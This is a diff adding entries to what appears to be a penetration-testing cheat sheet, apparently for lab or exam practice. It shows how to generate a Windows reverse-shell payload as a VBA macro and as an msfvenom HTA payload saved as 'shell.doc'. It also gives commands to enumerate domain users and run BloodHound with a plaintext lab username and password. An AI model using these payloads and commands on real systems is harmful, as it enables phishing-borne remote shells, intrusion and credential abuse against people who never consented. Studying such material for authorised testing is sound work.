@@ -633,6 +633,24 @@ put test.lnk
 # look for hashes in smb server
 ```
 
+#### Getting a Reverse Shell with VBA Macros
+
+```bash
+# With Minitrue
+
+cd /opt/Minitrue
+./minitrue
+select a payload: windows/x64/shell_reverse_tcp
+select the payload type: VBA Macro
+LHOST=$yourIP
+LPORT=$yourPort
+Payload encoder: None
+Select or enter file name (without extensions): hacker
+
+# With MSFVenom
+msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh -o shell.doc
+```
+
 #### Add a Comproised User to Remote Access through LDAP
 
 ```bash
@@ -774,4 +792,19 @@ Always run this is snmp is open:
 
 ```bash
 snmpwalk -v 2 -c public $ip NET-SNMP-EXTEND-MIB::nsExtendObjects
+```
+
+#### Get Users in DC (Authenticated)
+
+Gather information about users if you have creds but can't get on a box:
+
+```bash
+impacket-GetADUsers -dc-ip 192.168.214.122 "exampleH.example/" -all
+impacket-GetADUsers -dc-ip 192.168.214.122 exampleH.example/fmcsorley:CrabSharkJellyfish192 -all
+```
+
+#### Run BloodHound Remotely
+
+```bash
+/opt/BloodHound.py/bloodhound.py -d exampleH.example -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.214.122
 ```
